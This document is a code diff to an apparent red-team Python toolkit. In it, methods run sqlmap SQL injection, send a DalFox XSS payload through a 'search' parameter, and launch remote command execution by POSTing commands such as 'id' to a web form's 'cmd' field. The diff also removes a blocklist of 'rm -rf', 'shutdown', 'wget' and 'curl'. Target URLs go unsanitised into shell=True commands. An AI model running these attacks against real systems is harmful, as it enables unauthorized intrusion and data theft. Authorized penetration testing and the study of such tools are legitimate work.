@@ -4,21 +4,32 @@ from log_manager import log_attack
 
 class RedTeam:
     def sql_injection(self, target_url):
-        """Launches SQL Injection on the target website."""
-        command = f"sqlmap -u {target_url} --batch --dbs --forms --crawl=2"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        
-        log_attack("SQL Injection", target_url, result)
-        return result
+        """Launches an SQL Injection attack and logs a cleaner result."""
+        command = f"sqlmap -u {target_url} --batch --dbs --forms --crawl=1"
+
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+
+        log_output = []
+        for line in process.stdout:
+            clean_line = line.strip()
+            if clean_line:
+                print(clean_line)
+                log_output.append(clean_line)
+
+        process.wait()
+
+        # Extract important info instead of logging everything
+        filtered_output = [line for line in log_output if "Database" in line or "available databases" in line or "Type" in line or "Title" in line or "Payload" in line or "[*]" in line]
+        result_output = "\n".join(filtered_output) if filtered_output else "[INFO] No databases found."
+
+        log_attack("SQL Injection", target_url, result_output)
+        return result_output
+
 
     def xss_attack(self, target_url):
-        """Uses XSStrike to specifically test the vulnerable search parameter."""
+        """Uses DalFox to test for XSS vulnerabilities."""
         try:
-            # Explicitly test the "search" parameter
-            command = (
-                f"xsstrike -u \"{target_url}?search=XSS\" --params --fuzzer "
-                f"--headers \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
-            )
+            command = f"dalfox url \"{target_url}?search='<script>alert('XSS')</script>\""
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
             log_attack("XSS", target_url, result.stdout)
@@ -27,12 +38,21 @@ class RedTeam:
         except Exception as e:
             return f"[ERROR] {str(e)}"
 
-    def rce_attack(self, command):
-        """Attempts Remote Code Execution (RCE)"""
-        dangerous_commands = ["rm -rf", "shutdown", "wget", "curl"]
-        if any(cmd in command for cmd in dangerous_commands):
-            return "[ERROR] Dangerous command blocked."
 
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        log_attack("RCE", "Local System", result)
-        return result
+    def rce_attack(self, target_url, command="id"):
+        """Attempts Remote Code Execution by sending a command to a vulnerable web form."""
+        try:
+            payload = {"cmd": command, "Submit": "Run"}  # Adjust form field names based on target
+            response = requests.post(target_url, data=payload)
+
+            if response.status_code == 200:
+                result = response.text
+            else:
+                result = f"[FAILED] RCE failed with status {response.status_code}"
+
+            log_attack("RCE", target_url, result)
+            return result
+
+        except Exception as e:
+            return f"[ERROR] {str(e)}"
+
